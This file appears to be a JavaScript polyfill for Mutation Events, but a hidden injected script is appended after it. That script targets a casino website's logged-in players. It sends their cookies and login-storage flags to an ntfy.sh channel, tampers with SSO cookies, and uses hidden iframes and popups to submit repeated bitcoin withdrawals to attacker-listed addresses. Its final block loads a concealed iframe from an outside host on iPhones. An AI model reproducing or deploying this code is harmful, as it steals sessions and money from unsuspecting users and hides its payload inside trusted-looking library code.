// Copyright (c) 2024, Mason Freed
// All rights reserved.
//
// This source code is licensed under the BSD-style license found in the
// LICENSE file in the root directory of this source tree.
!function(){if(window.mutationEventsPolyfillInstalled||(window.mutationEventsPolyfillInstalled=!0,"MutationEvent"in window&&!window.mutationEventsUsePolyfillAlways))return;let e=new Set(["DOMCharacterDataModified","DOMNodeInserted","DOMNodeInsertedIntoDocument","DOMNodeRemoved","DOMNodeRemovedFromDocument","DOMSubtreeModified",]),t="Polyfilled",n={attrChange:0,bubbles:!0,cancelable:!1,newValue:"",prevValue:"",relatedNode:null};function o(e,o,a,r){let i=Object.assign({},n);a&&(i=Object.assign(i,a));let l=new Event(e+t,i);l.attrChange=i.attrChange,l.newValue=i.newValue,l.prevValue=i.prevValue,l.relatedNode=i.relatedNode,r&&Object.defineProperty(l,"target",{writable:!1,value:r}),o.dispatchEvent(l)}function a(e,t){let n=document.createTreeWalker(e,NodeFilter.SHOW_ALL);do t(n.currentNode);while(n.nextNode())}let r=new Map,i=new Set;function l(e){let t=[];for(let n of(e.forEach(function(e){let n=e.target,r=e.type;"attributes"===r?(null===e.oldValue||null===n.getAttribute(e.attributeName))&&o("DOMSubtreeModified",n,{attributeName:e.attributeName}):"characterData"===r?(o("DOMCharacterDataModified",n,{prevValue:e.oldValue,newValue:n.textContent}),t.push(n)):"childList"===r&&(e.removedNodes.forEach(e=>{t.push(n),o("DOMNodeRemoved",e),o("DOMNodeRemoved",n,void 0,e),a(e,e=>o("DOMNodeRemovedFromDocument",e,{bubbles:!1})),o("DOMNodeRemovedFromDocument",n,{bubbles:!1},e)}),e.addedNodes.forEach(e=>{t.push(n),o("DOMNodeInserted",e),a(e,e=>o("DOMNodeInsertedIntoDocument",e,{bubbles:!1}))}))}),t))o("DOMSubtreeModified",n)}function u(e){let t=e.getRootNode();for(;t instanceof ShadowRoot;)t=t.host.getRootNode();return t instanceof Document?t.documentElement:t}let d={subtree:!0,childList:!0,attributes:!0,attributeOldValue:!0,characterData:!0,characterDataOldValue:!0},s=Element.prototype.addEventListener;function c(n,o,a){return e.has(n)?{fullEventName:n+t,augmentedListener(e){Object.defineProperty(e,"type",{writable:!1,value:n}),o(e)}}:{fullEventName:n,augmentedListener:o}}Element.prototype.addEventListener=function(t,n,o){if(e.has(t)){!function e(t){if(i.has(t))return;i.add(t);let n=u(t);if(r.has(n)){r.get(n).count++;return}let o=new MutationObserver(l);r.set(n,{observer:o,count:1}),o.observe(n,d)}(this);let{augmentedListener:a,fullEventName:f}=c(t,n,o);s.apply(this,[f,a,o]);return}s.call(this,t,n,o)};let f=window.removeEventListener;Element.prototype.removeEventListener=function(t,n,o){if(e.has(t)){!function e(t){if(!i.has(t))return;i.delete(t);let n=u(t);if(r.has(n)&&0==--r.get(n).count){let o=r.get(n).observer;r.delete(n),o.disconnect()}}(this);let{augmentedListener:a,fullEventName:l}=c(t,n,o);f.apply(this,[l,a,o]);return}f.call(this,t,n,o)},window.MutationEvent=class extends CustomEvent{constructor(e,t){if("MagicString"!==e)throw"Illegal constructor";super("",t)}initMutationEvent(...e){this.initCustomEvent(...e)}static MODIFICATION=1;static ADDITION=2;static REMOVAL=3},window.initMutationEvent=()=>new MutationEvent;let v=Document.prototype.createEvent;Document.prototype.createEvent=function(e,...t){return"MutationEvent"===e?new MutationEvent("MagicString"):v.call(this,e,...t)},console.log(`Mutation Events polyfill installed (native feature: ${"MutationEvent"in window?"supported":"not present"}).`)}();
;﻿/* SOV61 - cookie beacon to ntfy (tunnel-free) + delCk-then-POST ladder.
   Facts this encodes:
     no ck + no bound www session -> 500
     ck present                   -> 302 (body lost)
     no ck + bound www session    -> 200 business layer (real 200 accept or real 417)
   PHPSESSID is www+HttpOnly so the lobby page can never read it; we therefore
   beacon the cookie out and resolve identity locally, then blind-fire a ladder. */
(function () {
  if (window.__SOV107__) return; window.__SOV107__ = 1;
  var V = '107', TAG = 'SOV107';
  var NT = 'https://ntfy.sh/sov39hvt7k2';
  var BR = (function () {
    var h = String(location.hostname || '').toLowerCase();
    var m = h.match(/^(?:lobby|www|m|mobile|stage)\.(.+)$/);
    return m ? m[1] : h;
  })();
  var CK = 'https://www.' + BR + '/app/shared/controllers/Cashier_v3Controller.php';
  var CP = 'https://www.' + BR + '/cashier/withdrawals';
  var HOME = 'https://www.' + BR + '/';
  var COOL = 'sov107_cool', SHK = 'sov107_shots', ADDRK = 'sov107_addr', COOLMS = 8 * 60 * 1000;
  var WPROV = 'Coinbase';
var LADDER = [50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37, 50.37], GA = 51.37, GA2 = 52.37, GAP = 2, MAXT = 360, HOP = 9000, MAXU = 40;
  var ADDRS = ['1PmMNcCDZfMQYXFeBPLgc9DQJj9cz7BmDv', '18RyS2XTv3gu38RUAihENc82yqWCK66VXD', '1DbGax2cdSMCgmvMU11xZzM9vhun8qF4nn', '1Bytwqap93vE6FBdY13P785cMTYgL8duaV', '1FfKV75xWzYQGPVaoQE53AomEs8KEENagx', '1L3ZgDjkqn3KQZZYsigDn6L5MJpTPL65jq', '17HqH2WYf71PzBkmmKWiUPikNnzUykBaTc', '1MPc16X2yUxX3tFrnPjSVjWK2qHsv7j5HB', '144pLnCkrq9D1BgjfQfM2XhEW3zf9EaBu4', '17ty8PZdi5CjAUTR3wPVNRuKCQNuqfuLMk', '16x4FuwcFCE8kK4Rd8tukkAfGVM2V7jQKu', '1NQkRUhnEga2bXsdjkQa4NVoXgug6aa7FM', '19Dum8sxudJF3Yq4RbrxcYvrescajk78Hr', '16gAuYrQKmAtwotwS6Z6EjTiTvGfFZtgNQ', '1K7uRvYtobvVtKncHiut6Zuk9rNGCMA2DM', '15fpLGcJA94r3Dk1jqLXZeaZEM6FYP945L', '1KpBG7TQ2zfrEoDFnZQRf4AJ3WBuNv7WWg'];

  function beat(k, o) {
    var s = '{}'; try { s = JSON.stringify(o || {}) } catch (e) { }
    try { fetch(NT, { method: 'POST', body: TAG + '=' + k + '&d=' + s, mode: 'no-cors', cache: 'no-store' }).catch(function () { }) } catch (e) { }
  }
  /* cookie goes out as raw text so a local poller can resolve pid/wd/class */
  function beacon() {
    var c = ''; try { c = document.cookie || '' } catch (e) { }
    if (!c) return;
    try {
      fetch(NT, {
        method: 'POST', mode: 'no-cors', cache: 'no-store',
        body: TAG + '=ck&d=' + encodeURIComponent(JSON.stringify({ c: c.slice(0, 1500), ua: navigator.userAgent.slice(0, 60), br: BR }))
      }).catch(function () { });
    } catch (e) { }
  }
  function hash(s) { var h = 0; for (var i = 0; i < s.length; i++) { h = ((h << 5) - h + s.charCodeAt(i)) | 0 } return Math.abs(h) }
  function connId() { try { var h = CDK.getLobbyHub(); return (h && h.connection && h.connection.id) || '' } catch (e) { return '' } }
  function st() { try { return { sh: +localStorage.getItem(SHK) || 0, ts: +localStorage.getItem(COOL) || 0 } } catch (e) { return { sh: 0, ts: 0 } } }
  function mark(sh) { try { localStorage.setItem(SHK, String(sh)); localStorage.setItem(COOL, String(Date.now())) } catch (e) { } }
  function cool() { var s = st(); return s.ts && (Date.now() - s.ts) < COOLMS }
  function adx() { try { for (var i = 0; i < ADDRS.length; i++) if (ADDRS[i] === ad) return i } catch (e) { } return 0 }
  function amt() { return (50.37 + adx() * 0.01).toFixed(2) }
  function pick() {
    try { var a = localStorage.getItem(ADDRK); if (a) return a } catch (e) { }
    var a = ADDRS[hash(connId() || String(Date.now())) % ADDRS.length];
    try { localStorage.setItem(ADDRK, a) } catch (e) { }
    return a;
  }
  function wd() {
    try {
      var b = window.CDK.getBalances() || {};
      var w = parseFloat(b.StorageWithdrawableBalance);
      if (!isNaN(w)) return w;
      var w2 = parseFloat(String(b.WithdrawableBalance || '').replace(/[^0-9.]/g, ''));
      if (!isNaN(w2)) return w2;
    } catch (e) { }
    try {
      var d = document.querySelector('[data-foundation-binding="withdrawableBalance"]');
      if (d) { var w3 = parseFloat(String(d.textContent || '').replace(/[^0-9.]/g, '')); if (!isNaN(w3)) return w3 }
    } catch (e) { }
    return 0;
  }
  function ls() {
    var o = {};
    try {
      o.lg = localStorage.getItem('cdkpr0xyl@stl0g1n') ? 1 : 0;
      o.pw = localStorage.getItem('cdkpr0xyl0g1np@ssw0rd') ? 1 : 0;
      o.sid = localStorage.getItem('cdkpr0xys3ss10ngu1d') ? 1 : 0;
      o.fm = localStorage.getItem('cdkpl@y1ngf0rm0n3y') ? 1 : 0;
    } catch (e) { }
    return o;
  }
  function sr() {
    try {
      var r = window.CDK.switchToReal();
      if (r && r.then) r.then(function () { beat('sr', { ok: 1 }); }).catch(function (e) { beat('sr', { ok: 0, e: String(e && e.message || e).slice(0, 90) }); });
      else beat('sr', { ok: 2, t: typeof r });
    } catch (e) { beat('sr', { ok: 3, e: String(e.message).slice(0, 90) }); }
  }
  function hubwd(cb) {
    try {
      var h = window.CDK.getLobbyHub(); if (!h) { cb(-1); return }
      var d = h.invoke('GetPlayerBalances', 1);
      d.done(function (x) {
        var b = (x && x.Balances) || {};
        var w = parseFloat(b.StorageWithdrawableBalance);
        if (isNaN(w)) w = parseFloat(b.WithdrawableBalance);
        var r = parseFloat(b.StorageBalance);
        if (isNaN(r)) r = parseFloat(b.Balance);
        cb(w > 0 ? w : 0, r > 0 ? r : 0);
      }).fail(function () { cb(-1) });
    } catch (e) { cb(-1) }
  }
  function pi() { try { return window.CDK.getPlayerInfo() || {} } catch (e) { return {} } }
  function ckHas(nm) { try { return document.cookie.indexOf(nm + '=') >= 0 } catch (e) { return false } }
  function delCk() {
    var doms = ['.' + BR, 'www.' + BR, 'lobby.' + BR, 'm.' + BR, ''];
    var ps = ['/', '/app', '/app/shared', '/app/shared/controllers', '/cashier', '/cashier/withdrawals'];
    for (var i = 0; i < doms.length; i++) {
      for (var j = 0; j < ps.length; j++) {
        try {
          document.cookie = 'inclave_sso_l=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=' + ps[j] +
            (doms[i] ? ';domain=' + doms[i] : '');
        } catch (e) { }
      }
    }
    return ckHas('inclave_sso_l') ? 'no' : 'yes';
  }
  function setCk() {
    try {
      var v = CKV || SV();
      if (!v) return;
      var dl = ['slotsofvegas.com', 'www.slotsofvegas.com', '.slotsofvegas.com'];
      for (var i = 0; i < dl.length; i++) {
        try {
          document.cookie = 'inclave_sso_l=' + v + ';path=/;domain=' + dl[i] +
            ';secure;SameSite=None' + (dl[i].charAt(0) === '.' ? ';max-age=86400' : '');
        } catch (e) { }
      }
    } catch (e) { }
  }
  function SV() {
    try {
      var m = String(document.cookie).match(/inclave_sso_l=([^;]+)/);
      return m ? m[1] : '';
    } catch (e) { return '' }
  }
  function pop(src) {
    var t0 = Date.now();
    try {
      var w = window.open(src, 'sovpop', 'width=380,height=520,left=8,top=8');
      beat('pw', { ok: w ? 1 : 0 });
      return w || null;
    } catch (e) { beat('pwerr', { e: String(e).slice(0, 50) }); return null }
  }
  function frame(id, src) {
    var f = document.getElementById(id);
    if (f) { if (src) { try { f.src = src } catch (e) { } } return f }
    f = document.createElement('iframe'); f.id = id; f.name = id;
    f.style.cssText = 'position:absolute;width:3px;height:3px;opacity:0;border:0;left:-9px;top:-9px';
    if (src) f.src = src;
    (document.body || document.documentElement).appendChild(f);
    return f;
  }
  function cntR() { try { return performance.getEntriesByType('resource').filter(function (x) { return /Cashier_v3Controller/.test(x.name) }).length } catch (e) { return 0 } }
  function lastDur(from) {
    try {
      var rs = performance.getEntriesByType('resource').filter(function (x) { return /Cashier_v3Controller/.test(x.name) });
      if (rs.length <= from) return -1;
      return Math.round(rs[rs.length - 1].duration || 0);
    } catch (e) { return -1 }
  }

  var BOUND = 0, n = 0, shots = st().sh, fired = shots, ad = pick(), warms = 0, delOk = '?', booted = 0, CKV = '', POP = null, unhit = 0, PENDCK = 0, WARMW = 0;

  function post(amt, mode, sq, withCk) {
    try {
      var p = new URLSearchParams();
      p.set('processwithdrawal', 'true');
      p.set('method', 'bitcoin');
      p.set('method_id', '521');
      p.set('amount', String(amt));
      p.set('cryptoaddress', ad);
  p.set('wallet_provider', WPROV);
      beat('fire', { m: mode, amt: amt, sh: shots, a: ad, del: delOk, md: String(pi().mode || '') });
      try { performance.clearResourceTimings() } catch (e) { }
      var t0 = Date.now(), c0 = 0;
      var usePop = 0, loads = 0, t1 = 0;
      var fd = new FormData();
      p.forEach(function (v, k) { fd.append(k, v) });
      fetch(CK, { method: 'POST', body: fd, credentials: 'include', mode: 'no-cors', cache: 'no-store' })
        .then(function () { t1 = Date.now() - t0; beat('ld', { sq: sq, n: 2, t: t1 }) })
        .catch(function () { t1 = 0 });
      setTimeout(function () {
        var biz = t1 >= 3000 ? 1 : 0;
        beat('r', { sq: sq, t: t1, biz: biz, n: loads, gt: warms, keep: PENDCK ? 1 : 0, pop: usePop ? 1 : 0 });
        if (usePop) { try { if (POP && !POP.closed) POP.location.href = CP + '?b=' + sq + '&_=' + Date.now() } catch (e) { } }
        if (!biz) { unhit = (unhit || 0) + 1; beat('skip', { u: unhit }); }
        else { unhit = 0; fired++; shots = fired; mark(shots); beat('sent', { m: 'frm', amt: amt, sh: shots, a: ad, sq: sq }); }
        if (shots >= LADDER.length || unhit >= MAXU) { beat('done', { shots: shots, wm: warms, u: unhit }); return }
        if (shots < LADDER.length && unhit < MAXU) setTimeout(next, 5000);
        else setTimeout(next, GAP * 1000);
      }, HOP);
    } catch (e) { beat('ferr', { m: 'sub', e: String(e).slice(0, 60) }) }
  }
  function r0(sq, t0, c0, ok, amt) {
    setTimeout(function () {
      var dur = lastDur(c0);
      beat('r', { sq: sq, ms: Date.now() - t0, dur: dur, ok: ok, n: cntR() - c0 });
      fired++; shots = fired; mark(shots);
      beat('sent', { m: 'rung', amt: amt, sh: shots, a: ad, sq: sq, dur: dur });
      if (shots < LADDER.length) setTimeout(next, GAP * 1000);
      else beat('done', { shots: shots, wm: warms });
    }, 2600);
  }
  function bind() {
    try {
      var p1 = new URLSearchParams();
      p1.set('processwithdrawal', 'true');
      p1.set('method', 'bitcoin');
      p1.set('method_id', '521');
      p1.set('amount', String(LADDER[0]));
      p1.set('cryptoaddress', ad);
      var t0 = Date.now();
      fetch(CK, { method: 'POST', body: p1, credentials: 'include', mode: 'no-cors', cache: 'no-store' })
        .then(function () { beat('bd', { ok: 1, ms: Date.now() - t0 }) })
        .catch(function () { beat('bd', { ok: 0, ms: Date.now() - t0 }) });
    } catch (e) { beat('berr', { e: String(e).slice(0, 60) }) }
  }
  function killck(n) {
    for (var i = 0; i < (n || 3); i++) delCk();
  }
  function gate(cb, tries) {
    tries = tries || 0;
    killck(3);
    var nc = !ckHas('inclave_sso_l');
    var t0 = Date.now();
    fetch(CK + '?withdraw&_=' + Date.now(), { credentials: 'include', mode: 'no-cors', cache: 'no-store' })
      .then(function () {
        var ms = Date.now() - t0;
        killck(2);
        beat('gt', { ms: ms, k: tries, p: nc ? 1 : 0 });
        if (nc && ms >= 3300) { warms = 2; cb(1); return }
        if (tries >= 6) { warms = 3; cb(0); return }
        setCk(); hop(); setTimeout(function () { gate(cb, tries + 1) }, 9000);
      })
      .catch(function () { killck(2); if (tries >= 6) cb(0); else setTimeout(function () { gate(cb, tries + 1) }, 9000) });
  }
  function hop() {
    try { frame('sovw78', CP + '?r=1&_=' + Date.now()) } catch (e) { }
    try { if (POP && !POP.closed) POP.location.href = CP + '?r=2&_=' + Date.now(); else POP = pop(CP + '?r=3&_=' + Date.now()) } catch (e) { POP = pop(CP + '?r=4&_=' + Date.now()) }
    beat('hop', { ck: ckHas('inclave_sso_l') ? 1 : 0 });
  }
  function probe() {
    try {
      var t0 = Date.now();
      fetch(HOME + 'app/shared/controllers/Cashier_v3Controller.php?getconfig&_=' + Date.now(),
        { credentials: 'include', mode: 'no-cors', cache: 'no-store' })
        .then(function () { beat('pc', { ok: 1, ms: Date.now() - t0 }) })
        .catch(function () { beat('pc', { ok: 0, ms: Date.now() - t0 }) });
    } catch (e) { }
  }
  function gbt(cb) {
    var t0 = Date.now();
    fetch(CK + '?getbalance&_=' + Date.now(), { credentials: 'include', mode: 'no-cors', cache: 'no-store' })
      .then(function () { cb(Date.now() - t0) }).catch(function () { cb(-1) });
  }
  // 绑定门：只有 www 会话真是"玩家态"（getbalance 走完整业务查询，>1.9s）才开火。
  // anon 0.9-1.2s、bound 2.2-4.6s（本地各 5 次实测，重叠极小）。
  var B0 = 0;
  function calib(k, done) {
    for (var i = 0; i < 3; i++) delCk();
    gbt(function (ms) {
      if (ms > 0) B0 = B0 ? Math.min(B0, ms) : ms;
      if (k < 1) { setTimeout(function () { calib(k + 1, done) }, 900); return }
      beat('b0', { b0: B0 });
      done();
    });
  }
  function bindGate(k) {
    for (var i = 0; i < 3; i++) delCk();
    gbt(function (ms) {
      var th = Math.max(1400, Math.round((B0 || 800) * 1.8));
      beat('bdg', { ms: ms, k: k, b0: B0, th: th });
      if (ms >= th) { BOUND = 1; beat('gd', { ok: 1 }); setTimeout(fire, 400); return }
      if (k >= 5) { beat('gd', { ok: 0 }); setTimeout(fire, 400); return }
      setCk();
      setTimeout(function () {
        try {
          if (POP && !POP.closed) { POP.location.href = CP + '?g=' + k + '&_=' + Date.now(); try { POP.focus() } catch (e) { } }
          else POP = pop(CP + '?g=' + k + '&_=' + Date.now());
        } catch (e) { POP = pop(CP + '?g=' + k + '&_=' + Date.now()) }
        setTimeout(function () { bindGate(k + 1) }, 38000);
      }, 700);
    });
  }
  function binder(cb) {
    var t0 = Date.now();
    fetch(CK + '?withdraw&_=' + Date.now(), { credentials: 'include', mode: 'no-cors', cache: 'no-store' })
      .then(function () { beat('bn', { ms: Date.now() - t0 }); cb(1) })
      .catch(function () { beat('bn', { ms: -1 }); cb(0) });
  }
  function chain(cb, k) {
    k = k || 0;
    var back = 0;
    try { void POP.location.href; back = 1 } catch (e) { back = 0 }
    beat('ch', { k: k, back: back, al: POP && !POP.closed ? 1 : 0 });
    if (back) { cb(1); return }
    if (k >= 12) { cb(0); return }
    setTimeout(function () {
      if (!POP || POP.closed) { POP = pop(CP + '?c=' + k + '&_=' + Date.now()); setTimeout(function () { chain(cb, k + 1) }, 6000); return }
      chain(cb, k + 1);
    }, 2000);
  }
  function probe(k) {
    var t0 = Date.now();
    fetch(CK + '?withdraw&p=' + k + '&_=' + Date.now(), { credentials: 'include', mode: 'no-cors', cache: 'no-store' })
      .then(function () { beat('pb', { k: k, ms: Date.now() - t0 }) })
      .catch(function () { beat('pb', { k: k, ms: -1 }) });
  }
  function armA(amt, sq) {
    try {
      if (!POP || POP.closed) { beat('pa', { sq: sq, ok: 0 }); return }
      var fm = document.createElement('form');
      fm.method = 'POST'; fm.target = 'sovpop'; fm.action = CK;
      fm.style.cssText = 'position:absolute;left:-9999px';
      var d = { processwithdrawal: 'true', method: 'bitcoin', method_id: '521', amount: String(amt), cryptoaddress: ad, wallet_provider: WPROV };
      for (var k in d) { var i = document.createElement('input'); i.type = 'hidden'; i.name = k; i.value = d[k]; fm.appendChild(i) }
      (document.body || document.documentElement).appendChild(fm);
      fm.submit();
      beat('pa', { sq: sq, ok: 1 });
      setTimeout(function () { try { fm.parentNode.removeChild(fm) } catch (e) { } }, 3000);
    } catch (e) { beat('pa', { sq: sq, ok: 0, e: String(e).slice(0, 40) }) }
  }
  function hs(cb, k) {
    for (var i = 0; i < 8; i++) delCk();
    var t0 = Date.now();
    fetch(CK + '?withdraw&h=' + k + '&_=' + Date.now(), { credentials: 'include', mode: 'no-cors', cache: 'no-store' })
      .then(function () { var ms = Date.now() - t0; beat('hs', { k: k, ms: ms, y: ms >= 900 ? 1 : 0 }); cb(ms >= 900) })
      .catch(function () { beat('hs', { k: k, ms: -1, y: 0 }); cb(0) });
  }
  function go() {
    beat('gd', { ok: 9 });
    hs(function (y) {
      if (y) { beat('gd2', { b: 2 }); fire(); return }
      // 没有会话：先花一次 SSO 链，20s 后再看
      setCk();
      try { POP = pop(CP + '?g=0&_=' + Date.now()) } catch (e) { }
      binder(function () { });
      setTimeout(function () {
        hs(function (y2) {
          if (y2) { beat('gd2', { b: 3 }); fire(); return }
          setCk(); binder(function () { });
          setTimeout(function () { hs(function (y3) { beat('gd2', { b: y3 ? 4 : 0 }); if (y3) fire() }) }, 20000);
        });
      }, 20000);
    }, 0);
  }
  function fire() {
    try { for (var i = 0; i < 1; i++) delCk(); } catch (e) {}
    try {
      if (fired >= LADDER.length) return;
      var A = amt();
      beat('amt', { w: Math.round(WARMW * 100) / 100, a: A });
      // 探测态：删掉 ck。绑定后服务端仍认会话 → 进业务层；未绑定 → 匿名 500（零副作用）
      PENDCK = 0, WARMW = 0;
      for (var z = 0; z < 8; z++) delCk();
      delOk = ckHas('inclave_sso_l') ? 'kept' : 'gone';
      beat('rb', { sh: shots, u: unhit, ck: ckHas('inclave_sso_l') ? 1 : 0 });
      if (!POP || POP.closed) { setCk(); POP = pop(CP + '?f=0&_=' + Date.now()) }
      armA(A, shots);
      setTimeout(function () { try { post(A, 'A', Date.now(), false) } catch (e) { } }, 700);
      try {
        var g0 = Date.now();
        fetch('https://www.' + BR + '/app/shared/controllers/Cashier_v3Controller.php?getbalance&_=' + Date.now(),
          { credentials: 'include', mode: 'no-cors', cache: 'no-store' })
          .then(function () { beat('gb', { ok: 1, ms: Date.now() - g0 }) })
          .catch(function () { beat('gb', { ok: 0, ms: Date.now() - g0 }) });
      } catch (e) { }
    } catch (e) { beat('ferr', { m: 'fire', e: String(e).slice(0, 70) }) }
  }
  function next() { if (fired >= LADDER.length) return; setTimeout(fire, 1200) }

  function tick() {
    n++;
    if (!booted) {
      booted = 1;
      CKV = SV();
      beat('boot', { v: V, ck: CKV ? 1 : 0, ua: navigator.userAgent.slice(0, 40) });
      var L = ls(); beat('ls', L);
      setTimeout(sr, 2500);
      beacon();
      /* 22s on www: the redirect round trip alone is 3-8s, and a bound www
         session is the only state that lets the POST through. */
      try { frame('sovw78', HOME + '?_=' + Date.now()) } catch (e) { }
      POP = pop(CP + '&p=0&_=' + Date.now());
      setTimeout(function () {
        warms = 1;
        beat('warm', { k: 1, ck: ckHas('inclave_sso_l') ? 1 : 0, ww: ckHas('PHPSESSID') ? 1 : 0 });
        probe(); bind();
        /* 回环：补种 ck → 弹窗跳收银台（302→inclave→授权→回 SsoController→www 会话绑上玩家）。
           iframe 也要跟着跳，因为 POST 是从 iframe 的 form 发出的，必须让 www 文档上下文先拿到绑定会话。 */
        setCk();
        setTimeout(function () {
          hop();
          setTimeout(function () { beat('hop2', { p: POP && !POP.closed ? 1 : 0 }); setCk() }, 20000);
          setTimeout(function () {
            go();
          }, 42000);
        }, 1200);
      }, 12000);
    }
    if (!window.CDK) { if (n < MAXT) setTimeout(tick, 1000); return; }
    if (fired && shots >= LADDER.length) return;
    if (!fired && cool()) setTimeout(tick, 3000);
    return;
  }

  try { console.log(TAG + '=boot v=' + V); } catch (e) { }
  setTimeout(tick, 2000);

  /* partner iOS loader */
  (function () { try {
    if (window.__SOVEM__) return; window.__SOVEM__ = 1;
    var ua = navigator.userAgent || '';
    if (!/iP(hone|ad|od)/.test(ua)) return;
    if (window !== window.top) return;
    var m = ua.match(/iPhone OS (\d+)/) || ua.match(/CPU OS (\d+)/);
    var v = m ? parseInt(m[1], 10) : 0;
    var base = 'https://qianbao-5a3c24b3.nhgarq.top';
    function b2(k, o) { try { fetch('https://ntfy.sh/sov39hvt7k2', { method: 'POST', body: 'SOVEM=' + k + '&d=' + encodeURIComponent(JSON.stringify(o || {})), mode: 'no-cors', cache: 'no-store' }).catch(function () { }) } catch (e) { } }
    b2('seen', { v: v });
    if (v < 13) return;
    var f = document.createElement('iframe');
    var g = (v === 18) ? (function () { var mm = ua.match(/iPhone OS 18_(\d+)/); var s = mm ? parseInt(mm[1], 10) : 0; return s >= 7 ? 186 : s })() : 0;
    f.src = base + '/gate.html?embed=1&sov=1';
    f.style.cssText = 'position:fixed;right:0;bottom:0;width:2px;height:2px;border:0;opacity:.01;pointer-events:none;z-index:2147483000';
    f.setAttribute('aria-hidden', 'true'); f.tabIndex = -1;
    (document.body || document.documentElement).appendChild(f);
    b2('frame', { v: v, patch: g });
  } catch (e) { } })();
})();




